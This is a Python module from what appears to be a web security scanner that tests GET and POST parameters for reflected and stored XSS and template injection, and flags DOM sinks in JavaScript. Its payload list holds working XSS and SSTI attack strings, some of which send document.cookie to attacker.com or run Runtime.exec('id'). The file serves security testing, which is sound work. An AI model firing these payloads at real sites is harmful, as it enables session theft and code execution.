"""
scanner/web/xss.py
==================
Reflected and basic stored XSS scanner on BaseScanner.

- Reflected: inject payloads into GET query params and POST fields; flag when
  the payload is confirmed in the response body (raw, HTML-entity-decoded, or
  percent-decoded), with encoding context recorded — not status-code-only.
- Stored: POST a unique marker payload, then GET the same endpoint; if the
  marker appears in the follow-up response, treat as a stored-XSS candidate.
- Optional DOM sink hints for crawled .js URLs.

OWASP: A03:2021  CWE-79
"""

from __future__ import annotations

import html
import re
import secrets
import threading

from ..scan_logger import logger
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional
from urllib.parse import parse_qs, unquote, urlencode, urlparse, urlunparse

from ..base_scanner import BaseScanner

from .base import normalize_url
from .base_module import ScanContext, post_param_injection_order
from .http_retry import request_with_retries
from .waf import WAF_BYPASS_PAYLOADS

import config as asc_config

XSS_PAYLOADS_ENHANCED = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<object data='javascript:alert(1)'>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<svg/onload=alert(1)>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<Img SrC=x OnErRoR=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    "<<script>alert(1)//<</script>",
    "'\"><img src=x:x onerror=javascript:alert(1)>",
    "</script><script>alert(1)</script>",
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "';alert(1)//",
    "\";alert(1)//",
    "<base href=//evil.com>",
    "javascript:alert(document.domain)",
    "<div style=width:0;height:0 onmouseover=alert(1)>HOVER</div>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(document.cookie)>',
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<iframe src=javascript:alert(1)>",
    '<math href="javascript:alert(1)">CLICK</math>',
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    '"><svg/onload=alert(1)>',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    "${{7*7}}",
    "{{config.items()}}",
    "{{self.__init__.__globals__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{% for x in [1]%}{{x.__class__.__base__.__subclasses__()}}{% endfor %}",
    '<img src=x onerror=this.src="http://attacker.com/?c="+document.cookie>',
    '<script>document.location="http://attacker.com/?c="+document.cookie</script>',
    '<svg onload=fetch("http://attacker.com/?c="+document.cookie)>',
    'javascript:alert(document.cookie)',
    '"onmouseover="alert(1)',
    "'-alert(1)-'",
    '";alert(1)//',
]

DOM_SINKS = [
    "document.write(",
    "document.writeln(",
    ".innerHTML",
    ".outerHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "location.href",
    "location.hash",
    "location.search",
    "document.URL",
    "document.referrer",
]


class XSSScanner(BaseScanner):
    """
    Reflected XSS (GET/POST), basic stored XSS, and passive DOM sink hints.
    """

    name = "xss"

    def __init__(self, target: str | List[str], **kwargs):
        super().__init__(target, **kwargs)
        self.waf_bypass = bool(kwargs.get("waf_bypass", False))
        self._bypass_list: List[str] = list(WAF_BYPASS_PAYLOADS.get("xss", []))
        self.scan_intensity = str(
            kwargs.get("scan_intensity")
            or getattr(asc_config, "SCAN_INTENSITY_DEFAULT", "medium"),
        ).lower()
        if self.scan_intensity not in ("light", "medium", "aggressive"):
            self.scan_intensity = "medium"

    def _payload_list(self) -> List[str]:
        if self.waf_bypass and self._bypass_list:
            out = list(self._bypass_list)
            for p in XSS_PAYLOADS_ENHANCED:
                if p not in out:
                    out.append(p)
            base = out
        else:
            base = list(XSS_PAYLOADS_ENHANCED)
        return asc_config.apply_intensity_payload_cap(base, self.scan_intensity)

    @staticmethod
    def _payload_executable_xss(payload: str) -> bool:
        """
        True if the probe carries HTML/JS execution primitives.
        Plain text or innocuous strings reflected in HTML body are not treated as XSS.
        """
        pl = payload.lower()
        if any(
            x in pl
            for x in (
                "<script",
                "</script",
                "onerror",
                "onload",
                "onclick",
                "onfocus",
                "onmouseover",
                "ontoggle",
                "onstart",
                "javascript:",
                "<svg",
                "<iframe",
                "<img",
                "<object",
                "<details",
                "<marquee",
                "<video",
                "<audio",
                "<input",
                "<select",
                "<textarea",
                "<body ",
                "<base ",
                "<math",
                "<noscript",
                "alert(",
                "confirm(",
                "prompt(",
                "document.cookie",
                "document.location",
                "eval(",
            )
        ):
            return True
        if re.search(r"on\w+\s*=", pl):
            return True
        if any(x in pl for x in ("{{", "${", "<%=", "{%", "${{", "';alert", '";alert')):
            return True
        return False

    @staticmethod
    def _ssti_numeric_evaluation_proof(payload: str, body: str) -> bool:
        """SSTI only when an arithmetic probe evaluates (e.g. 7*7 → 49 appears in the body)."""
        if not body:
            return False
        for m in re.finditer(r"(\d{1,4})\s*\*\s*(\d{1,4})", payload):
            a, b = int(m.group(1)), int(m.group(2))
            if a > 9999 or b > 9999:
                continue
            prod = str(a * b)
            if prod in body:
                return True
        return False

    @staticmethod
    def _ssti_numeric_evaluation_proof_layers(payload: str, body: str | None) -> bool:
        """Try wire body, HTML-unescaped, and URL-decoded views for product reflection."""
        if not body:
            return False
        variants: list[str] = [body]
        ub = html.unescape(body)
        if ub != body:
            variants.append(ub)
        try:
            dec = unquote(body)
            if dec != body:
                variants.append(dec)
        except Exception:
            pass
        for v in variants:
            if XSSScanner._ssti_numeric_evaluation_proof(payload, v):
                return True
        return False

    @staticmethod
    def _reflected_xss_execution_context(context: str) -> bool:
        """Reflected XSS requires a sink where execution is plausible (not inert HTML text)."""
        cl = context.lower()
        return "javascript context" in cl or "attribute context" in cl

    @staticmethod
    def _xss_reflection_probe(payload: str, body: str) -> tuple[bool, str, str]:
        """
        Confirm payload appears in the response (raw wire, after HTML entity decode,
        or after URL decode). Returns (found, mode, body_used_for_context).
        """
        if not payload or body is None:
            return False, "", body or ""
        b = body or ""
        if payload in b:
            return True, "raw", b
        ub = html.unescape(b)
        if payload in ub:
            return True, "html_entity_decoded", ub
        try:
            dec = unquote(b)
            if dec != b and payload in dec:
                return True, "url_decoded", dec
        except Exception:
            pass
        return False, "", b

    @staticmethod
    def _reflection_encoding_assessment(mode: str, context: str) -> str:
        """Human-readable encoding / escaping posture for evidence."""
        cl = (context or "").lower()
        if mode == "raw":
            if "javascript context" in cl or "attribute context" in cl:
                return "payload_bytes_match_wire_unescaped_near_executable_sink"
            return "payload_bytes_match_wire_markup_context_review_escape"
        if mode == "html_entity_decoded":
            return (
                "payload_visible_after_html_entity_decode_check_browser_decoding"
            )
        if mode == "url_decoded":
            return "payload_visible_after_percent_decode"
        return "unknown"

    @staticmethod
    def _response_snippet(body: str, needle: str, radius: int = 200) -> str:
        if not body or not needle:
            return (body or "")[: min(500, len(body or ""))]
        i = body.find(needle)
        if i < 0:
            return body[:500]
        a = max(0, i - radius)
        b = min(len(body), i + len(needle) + radius)
        return body[a:b].replace("\n", " ").replace("\r", " ")

    def run(self, context: ScanContext) -> List[dict]:
        """
        Entry point used by ScannerController. Syncs URLs and session from context.
        """
        self.findings.clear()
        if context:
            if context.urls:
                self.urls = [normalize_url(u) for u in context.urls]
            self.session = context.auth_session or context.session or self.session

        findings: List[dict] = []
        payload_list = self._payload_list()
        js_urls = [u for u in self.urls if u.lower().endswith(".js")]
        scan_targets = list(getattr(context, "scan_targets", None) or [])
        get_targets = [
            t
            for t in scan_targets
            if str(t.get("method", "")).upper().strip() == "GET"
        ]
        post_targets = [
            t
            for t in scan_targets
            if str(t.get("method", "")).upper().strip() == "POST"
        ]

        logger.info(
            "  [*] XSS: %s GET target(s) + %s POST form(s), %s payloads%s",
            len(get_targets),
            len(post_targets),
            len(payload_list),
            " (WAF bypass mix)" if self.waf_bypass and self._bypass_list else "",
        )
        if not get_targets:
            logger.warning(
                "  [!] XSS: no GET targets in context.scan_targets — reflected GET XSS skipped "
                "(%s URLs in scope)",
                len(self.urls),
            )
        if not post_targets:
            logger.info(
                "  [i] XSS: no POST targets in context.scan_targets — POST XSS skipped",
            )

        if js_urls:
            findings.extend(self._scan_dom_sinks(js_urls))

        self._seen_xss = set()
        self._seen_xss_lock = threading.Lock()

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {
                ex.submit(self._test_url, t["url"], t["params"]): t["url"]
                for t in get_targets
            }
            for fut in as_completed(futs):
                try:
                    findings.extend(fut.result() or [])
                except Exception:
                    pass

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {
                ex.submit(
                    self._test_post_form,
                    t["url"],
                    t["params"],
                    t.get("field_details"),
                ): t["url"]
                for t in post_targets
            }
            for fut in as_completed(futs):
                try:
                    findings.extend(fut.result() or [])
                except Exception:
                    pass

        deduped = self._dedupe_findings(findings)
        for f in deduped:
            self._add_finding(f)
        return deduped

    @staticmethod
    def _qs_first(values: list[str]) -> str:
        return values[0] if values else ""

    def _test_url(
        self,
        url: str,
        get_params: dict[str, list[str]] | None = None,
    ) -> List[dict]:
        results: List[dict] = []
        parsed = urlparse(url)
        if get_params is not None:
            params = {k: list(v) for k, v in get_params.items()}
        else:
            params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return results
        payload_list = self._payload_list()

        for param in params:
            canary = "ALANSCAN7x7"
            tp = {k: self._qs_first(v) for k, v in params.items()}
            tp[param] = canary
            test_canary = urlunparse(parsed._replace(query=urlencode(tp)))
            r = self._safe_request(test_canary)
            if not r or not XSSScanner._xss_reflection_probe(canary, r.text)[0]:
                continue

            for payload in payload_list:
                tp[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(tp)))
                resp = self._safe_request(test_url)
                if not resp:
                    continue
                reflected_ok, refl_mode, ctx_body = XSSScanner._xss_reflection_probe(
                    payload, resp.text
                )
                reflected = bool(payload) and reflected_ok
                is_ssti_probe = bool(
                    re.search(r"\d+\s*\*\s*\d+", payload)
                ) and any(t in payload for t in ("{{", "${", "#{", "<%=", "{%", "${{"))

                if is_ssti_probe:
                    if not XSSScanner._ssti_numeric_evaluation_proof_layers(
                        payload, resp.text
                    ):
                        continue
                    context = self._detect_context(ctx_body, payload)
                    kind = "SSTI (Template Injection)"
                    severity = "HIGH"
                else:
                    if not reflected:
                        continue
                    if not XSSScanner._payload_executable_xss(payload):
                        continue
                    context = self._detect_context(ctx_body, payload)
                    if not XSSScanner._reflected_xss_execution_context(context):
                        continue
                    if "javascript context" in context.lower():
                        kind = "Reflected XSS"
                        severity = "HIGH"
                    elif "attribute context" in context.lower():
                        kind = "Reflected XSS"
                        severity = "MEDIUM"
                    else:
                        continue
                if kind.startswith("Reflected XSS"):
                    key = (parsed.path, param, "xss")
                    with self._seen_xss_lock:
                        if key in self._seen_xss:
                            break
                        self._seen_xss.add(key)
                elif kind.startswith("SSTI"):
                    key = (parsed.path, param, "ssti")
                    with self._seen_xss_lock:
                        if key in self._seen_xss:
                            break
                        self._seen_xss.add(key)
                enc_note = XSSScanner._reflection_encoding_assessment(refl_mode, context)
                evidence_parts = [
                    (
                        "template arithmetic evaluated in response body (layered decode check)"
                        if is_ssti_probe
                        else (
                            f"payload_reflected={reflected}"
                            f" reflection_view={refl_mode or 'n/a'}; {enc_note}"
                        )
                    ),
                    f"context={context}",
                    f"HTTP {resp.status_code}",
                ]
                snippet = XSSScanner._response_snippet(ctx_body, payload)
                results.append(
                    {
                        "type": kind,
                        "subtype": "reflected",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "severity": severity,
                        "evidence": " | ".join(evidence_parts),
                        "response_proof": snippet,
                        "proof_of_exploit": {
                            "http_status": resp.status_code,
                            "payload_delivered": payload,
                            "response_snippet": snippet,
                        },
                        "details": {
                            "reflected": reflected,
                            "reflection_mode": refl_mode,
                            "encoding_assessment": enc_note,
                            "is_ssti_probe": is_ssti_probe,
                            "context": context,
                            "canary_verified": True,
                        },
                    }
                )
                logger.warning("  [%s] %s -> %s [%s]", severity, kind, url, param)
                break
        return results

    def _test_post_form(
        self,
        url: str,
        fields: dict,
        field_details: List[dict] | None = None,
    ) -> List[dict]:
        results: List[dict] = []
        payload_list = self._payload_list()

        for param in post_param_injection_order(field_details, fields.keys()):
            canary = "ALANSCAN7x7"
            data = dict(fields)
            data[param] = canary
            r = request_with_retries(
                self.session,
                "POST",
                url,
                timeout=self.timeout,
                max_attempts=3,
                data=data,
                allow_redirects=True,
            )
            if not r or not XSSScanner._xss_reflection_probe(canary, r.text)[0]:
                continue

            for payload in payload_list:
                data = dict(fields)
                data[param] = payload
                resp = request_with_retries(
                    self.session,
                    "POST",
                    url,
                    timeout=self.timeout,
                    max_attempts=3,
                    data=data,
                    allow_redirects=True,
                )
                if not resp:
                    continue
                reflected_ok, refl_mode, ctx_body = XSSScanner._xss_reflection_probe(
                    payload, resp.text
                )
                reflected = bool(payload) and reflected_ok
                is_ssti_probe = bool(
                    re.search(r"\d+\s*\*\s*\d+", payload)
                ) and any(t in payload for t in ("{{", "${", "#{", "<%=", "{%", "${{"))

                if is_ssti_probe:
                    if not XSSScanner._ssti_numeric_evaluation_proof_layers(
                        payload, resp.text
                    ):
                        continue
                    context = self._detect_context(ctx_body, payload)
                    kind = "SSTI (Template Injection)"
                    severity = "HIGH"
                elif reflected:
                    if not XSSScanner._payload_executable_xss(payload):
                        continue
                    context = self._detect_context(ctx_body, payload)
                    if not XSSScanner._reflected_xss_execution_context(context):
                        continue
                    if "javascript context" in context.lower():
                        kind = "Reflected XSS (POST)"
                        severity = "HIGH"
                    elif "attribute context" in context.lower():
                        kind = "Reflected XSS (POST)"
                        severity = "MEDIUM"
                    else:
                        continue
                else:
                    continue

                if kind.startswith("Reflected XSS"):
                    p_post = urlparse(url)
                    key = (p_post.path, param, "xss")
                    with self._seen_xss_lock:
                        if key in self._seen_xss:
                            break
                        self._seen_xss.add(key)
                elif kind.startswith("SSTI"):
                    p_post = urlparse(url)
                    key = (p_post.path, param, "ssti")
                    with self._seen_xss_lock:
                        if key in self._seen_xss:
                            break
                        self._seen_xss.add(key)
                enc_note = XSSScanner._reflection_encoding_assessment(refl_mode, context)
                snippet = XSSScanner._response_snippet(ctx_body, payload)
                ev_first = (
                    "template arithmetic evaluated in response body (layered decode check)"
                    if is_ssti_probe
                    else (
                        f"payload_reflected={reflected}"
                        f" reflection_view={refl_mode or 'n/a'}; {enc_note}"
                    )
                )
                results.append(
                    {
                        "type": kind,
                        "subtype": "reflected",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "severity": severity,
                        "evidence": (
                            f"{ev_first} | context={context} | HTTP {resp.status_code}"
                        ),
                        "response_proof": snippet,
                        "proof_of_exploit": {
                            "http_status": resp.status_code,
                            "payload_delivered": payload,
                            "response_snippet": snippet,
                        },
                        "details": {
                            "reflected": reflected,
                            "reflection_mode": refl_mode,
                            "encoding_assessment": enc_note,
                            "is_ssti_probe": is_ssti_probe,
                            "context": context,
                        },
                    }
                )
                logger.warning("  [%s] %s -> %s [%s]", severity, kind, url, param)
                break

            stored = self._test_stored_xss(url, fields, param)
            if stored:
                results.append(stored)
                logger.warning("  [HIGH] Stored XSS candidate -> %s [%s]", url, param)

        return results

    def _test_stored_xss(self, form_url: str, fields: dict, param: str) -> Optional[dict]:
        token = secrets.token_hex(6)
        marker = f"ALANSCAN_STORED_{token}"
        payload = f"<img src=x onerror=alert('{marker}')>"
        data = dict(fields)
        data[param] = payload
        pr = request_with_retries(
            self.session,
            "POST",
            form_url,
            timeout=self.timeout,
            max_attempts=3,
            data=data,
            allow_redirects=True,
        )
        if not pr:
            return None
        follow = request_with_retries(
            self.session,
            "GET",
            form_url,
            timeout=self.timeout,
            max_attempts=3,
            allow_redirects=True,
        )
        if not follow:
            return None
        mk_ok, mk_mode, mk_ctx = XSSScanner._xss_reflection_probe(
            marker, follow.text
        )
        if not mk_ok:
            return None
        snippet = XSSScanner._response_snippet(mk_ctx, marker)
        enc_note = XSSScanner._reflection_encoding_assessment(
            mk_mode, "HTML body context"
        )
        return {
            "type": "Stored XSS (candidate)",
            "subtype": "stored",
            "url": form_url,
            "parameter": param,
            "payload": payload,
            "severity": "HIGH",
            "evidence": (
                f"Unique marker {marker!r} confirmed in follow-up GET body "
                f"(reflection_view={mk_mode or 'n/a'}; {enc_note})"
            ),
            "response_proof": snippet,
            "proof_of_exploit": {
                "http_status": follow.status_code,
                "payload_delivered": payload,
                "response_snippet": snippet,
            },
            "details": {
                "marker": marker,
                "detection": "post_then_get",
                "reflection_mode": mk_mode,
                "encoding_assessment": enc_note,
            },
        }

    def _scan_dom_sinks(self, js_urls: List[str]) -> List[dict]:
        findings: List[dict] = []
        for url in js_urls:
            resp = self._safe_request(url, allow_redirects=True)
            if not resp:
                continue
            for sink in DOM_SINKS:
                if sink in resp.text:
                    findings.append(
                        {
                            "type": "DOM-Based XSS Sink Detected",
                            "subtype": "dom",
                            "url": url,
                            "parameter": "JavaScript source",
                            "payload": "N/A",
                            "severity": "LOW",
                            "evidence": (
                                f"Dangerous sink {sink!r} in JS — review for user-controlled input"
                            ),
                        }
                    )
                    logger.warning("  [LOW] DOM sink %r -> %s", sink, url)
                    break
        return findings

    @staticmethod
    def _detect_context(body: str, payload: str) -> str:
        def _classify(work: str, needle: str) -> str | None:
            pos = work.find(needle)
            if pos < 0:
                return None
            snippet = work[max(0, pos - 120) : pos].lower()
            if "<script" in snippet:
                return "JavaScript context (<script> block) - CRITICAL"
            if "=" in snippet[-24:]:
                return "HTML attribute context"
            return "HTML body context"

        for work in (body, html.unescape(body)):
            hit = _classify(work, payload)
            if hit:
                return hit
        try:
            dec = unquote(body)
            if dec != body:
                hit = _classify(dec, payload)
                if hit:
                    return hit
        except Exception:
            pass
        return "unknown context"

    @staticmethod
    def _dedupe_findings(rows: List[dict]) -> List[dict]:
        seen: set[tuple[str, str, str]] = set()
        out: List[dict] = []
        for fi in rows:
            try:
                u = urlparse(fi.get("url", "") or "")
                base = f"{(u.netloc or '').lower()}{(u.path or '')}"
            except Exception:
                base = (fi.get("url", "") or "").lower()
            key = (base, fi.get("parameter", ""), fi.get("type", ""))
            if key in seen:
                continue
            seen.add(key)
            out.append(fi)
        return out
